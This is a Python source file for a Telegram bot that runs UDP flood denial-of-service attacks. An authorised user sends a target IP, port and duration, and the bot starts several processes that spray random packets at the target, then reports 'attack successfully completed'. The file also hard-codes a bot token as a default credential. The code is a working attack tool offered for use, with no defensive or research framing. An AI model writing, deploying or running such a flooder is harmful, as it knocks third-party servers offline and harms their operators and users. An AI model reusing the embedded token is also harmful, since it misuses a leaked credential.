import json
import socket
import random
import time
import shutil
import platform
import psutil
import threading
import os
from datetime import datetime, timedelta
from multiprocessing import Process, cpu_count
from telegram import Update
from telegram.ext import Application, MessageHandler, CommandHandler, filters, ContextTypes
import requests

# ==================== CONFIGURATION FROM ENV ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8747025027:AAGcXXUWVsG0LhZcR_ZnDC-M1eG2rYCEoCU")
ADMIN_USER = os.environ.get("ADMIN_USER", "bodo_xbin")
DEFAULT_PROCESSES = 300
MAX_DURATION = 250
DATA_FILE = "user_data.json"

# ==================== GLOBAL STATE ====================
attack_running = False
user_attack_counts = {}

# ==================== DATA PERSISTENCE ====================
def load_data():
    global user_attack_counts
    try:
        with open(DATA_FILE, "r") as file:
            data = json.load(file)
            user_attack_counts = data.get("user_attack_counts", {})
    except FileNotFoundError:
        user_attack_counts = {}

def save_data():
    with open(DATA_FILE, "w") as file:
        data = {"user_attack_counts": user_attack_counts}
        json.dump(data, file)

# ==================== HELPER FUNCTIONS ====================
def get_isp_and_public_ip():
    max_retries = 3
    retries = 0
    while retries < max_retries:
        try:
            response = requests.get("http://ipinfo.io")
            response.raise_for_status()
            data = response.json()
            isp = data.get("org", "Unknown ISP")
            public_ip = data.get("ip", "Unknown IP")
            return isp, public_ip
        except Exception:
            retries += 1
            time.sleep(1)
    return "Unknown ISP", "Unknown IP"

def get_system_info():
    os_name = platform.system()
    total, used, free = shutil.disk_usage("/")
    total_gb = total // (2**30)
    used_gb = used // (2**30)
    free_gb = free // (2**30)
    num_cores = cpu_count()
    cpu_usage_per_core = psutil.cpu_percent(percpu=True)
    return os_name, total_gb, used_gb, free_gb, num_cores, cpu_usage_per_core

def udp_flood(target_ip, target_port, duration):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = random._urandom(200)
        timeout = time.time() + duration
        while time.time() < timeout:
            client.sendto(bytes_to_send, (target_ip, target_port))
    except Exception:
        pass  # ignore send errors silently

def calculate_processes():
    num_cores = cpu_count()
    if num_cores > 4:
        return 2
    elif num_cores <= 2:
        return int(1.5 * num_cores)
    else:
        return num_cores - 1

async def start_attack(target_ip, target_port, duration, update: Update):
    global attack_running
    attack_running = True

    total_cores = cpu_count()
    num_processes = calculate_processes()
    message = f"IP: {target_ip}\nPORT: {target_port}\nUsing {num_processes} CPU cores out of {total_cores}\nDuration: {duration} seconds"

    await update.message.reply_text("🚀 Attack has been initiated 🚀")
    await update.message.reply_text(message)

    process_list = []
    for i in range(num_processes):
        process = Process(target=udp_flood, args=(target_ip, target_port, duration))
        process_list.append(process)
        process.start()

    for process in process_list:
        process.join()

    attack_running = False
    await update.message.reply_text("🚀 ATTACK SUCCESSFULLY COMPLETED 🚀")

# ==================== TELEGRAM HANDLERS ====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    try:
        if attack_running:
            await update.message.reply_text("Please wait, another attack is running.")
            return

        username = update.message.from_user.username
        if username != ADMIN_USER:
            await update.message.reply_text("⚠️ You are not authorized to use this bot ⚠️")
            return

        message_text = update.message.text.strip()
        parts = message_text.split()
        if len(parts) != 3:
            await update.message.reply_text("Usage: <IP> <PORT> <DURATION>")
            return

        target_ip = parts[0]
        target_port = int(parts[1])
        duration = int(parts[2])

        restricted_ports = {8700, 20000, 443, 17500, 9031, 20002, 20001}
        if target_port in restricted_ports or target_port < 10000:
            await update.message.reply_text("⚠️ This port is not allowed for attack ⚠️")
            return

        if duration > MAX_DURATION:
            await update.message.reply_text(f"Duration cannot be more than {MAX_DURATION // 60} minutes.")
            return

        await start_attack(target_ip, target_port, duration, update)

    except Exception as e:
        await update.message.reply_text(f"Error: {e}")
        attack_running = False

async def handle_stat_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Server is running")

async def handle_cpu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    num_cores = cpu_count()
    await update.message.reply_text(f"This machine has {num_cores} CPU cores.")

async def handle_ip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    isp, public_ip = get_isp_and_public_ip()
    await update.message.reply_text(f"ISP: {isp}\nPublic IP: {public_ip}")

async def handle_machine_id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    isp, public_ip = get_isp_and_public_ip()
    os_name, total_gb, used_gb, free_gb, num_cores, cpu_usage_per_core = get_system_info()
    cpu_usage_str = "\n".join([f"Core {i+1}: {usage}%" for i, usage in enumerate(cpu_usage_per_core)])
    await update.message.reply_text(
        f"ISP: {isp}\n"
        f"Public IP: {public_ip}\n"
        f"OS: {os_name}\n"
        f"Total Storage: {total_gb} GB\n"
        f"Used Storage: {used_gb} GB\n"
        f"Available Storage: {free_gb} GB\n"
        f"CPU Cores: {num_cores}\n"
        f"CPU Usage per Core:\n{cpu_usage_str}"
    )

# ==================== HEALTH CHECK HTTP SERVER ====================
def run_health_server():
    from http.server import HTTPServer, BaseHTTPRequestHandler
    class HealthHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is alive")
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    server.serve_forever()

# ==================== MAIN ====================
def main():
    # start health server in background
    threading.Thread(target=run_health_server, daemon=True).start()

    load_data()
    application = Application.builder().token(BOT_TOKEN).build()

    # Message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CommandHandler("stat", handle_stat_command))
    application.add_handler(CommandHandler("cpu", handle_cpu_command))
    application.add_handler(CommandHandler("ip", handle_ip_command))
    application.add_handler(CommandHandler("machine_id", handle_machine_id_command))

    application.run_polling()

if __name__ == "__main__":
    main()